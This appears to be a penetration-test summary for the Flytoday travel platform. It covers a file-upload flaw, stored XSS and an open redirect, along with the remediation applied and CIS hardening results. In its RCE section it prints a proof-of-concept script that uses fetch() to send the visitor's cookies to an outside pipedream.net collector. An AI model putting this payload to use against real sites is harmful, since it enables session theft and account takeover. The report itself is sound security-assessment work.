# ✈️ Flytoday Travel Platform — Security Hardening & Pentest

**Client:** Flytoday.ir (حرکت اول) — Pre-launch travel booking platform  
**Assessment Type:** Gray-Box Web Pentest + CIS Benchmark Compliance Hardening  
**Standards:** OWASP WSTG · CIS IIS 10 v1.2.1 · CIS Ubuntu 18.04 · CVSSv3.1  
**Outcome:** All critical findings patched and verified before public launch ✅

---

## Web Application Findings

| ID | Vulnerability | CVSS | Status |
|---|---|:---:|:---:|
| FLY-001 | **RCE via File Upload Double-Extension Bypass** | 9.8 | ✅ Fixed pre-launch |
| FLY-002 | **Stored XSS — Cookie Exfiltration via CDN** | 8.0 | ✅ Fixed pre-launch |
| FLY-003 | **Open Redirect via Uploaded HTML** | 6.1 | ✅ Fixed pre-launch |

---

## RCE Finding — Key Details

**Vulnerability:** File upload on `cdn-a.flytoday.ir` accepted double-extension files (`test.html`), stored them with original extension, and served them with `Content-Type: text/html` — enabling browser execution of embedded JavaScript.

**Live PoC payload (CDN URL now decommissioned):**
```html
<script>
  fetch('https://en3qzyjiummnl.x.pipedream.net?cookie=' + document.cookie);
  alert("10");
</script>
```

**Impact:** JavaScript executed from the trusted `cdn-a.flytoday.ir` domain, exfiltrating session cookies from any user who visited the link. Enables mass phishing, account takeover, and malware distribution from a trusted domain.

**Remediation applied:**
- Server-side magic byte validation (not extension-based)
- Files renamed to UUID on upload; extension stripped
- CDN domain sandboxed from main domain (no cookie sharing)
- `Content-Disposition: attachment` enforced on all user uploads
- MIME type whitelist applied (images only)

---

## CIS Hardening Results

| Server | FAILED | WARNING | PASSED | Total |
|---|:---:|:---:|:---:|:---:|
| 217.218.33.98 (IIS 10 / Windows) | 21 | 9 | 25 | 55 |
| 5.0.0.106 (Ubuntu 18.04 / Apache) | 1 | 6 | 190 | 242* |

*45 items marked Corp-Policy (accepted risk with documented rationale)

**Key IIS failures fixed:** WebDAV disabled · Host headers enforced · Forms auth SSL required · Security response headers added (CSP, HSTS, X-Frame-Options, X-Content-Type-Options) · TLS 1.0/1.1 disabled · Anonymous auth restricted · Default error pages configured

---

📄 **[→ View Full Report with CIS Detail](./report.html)**
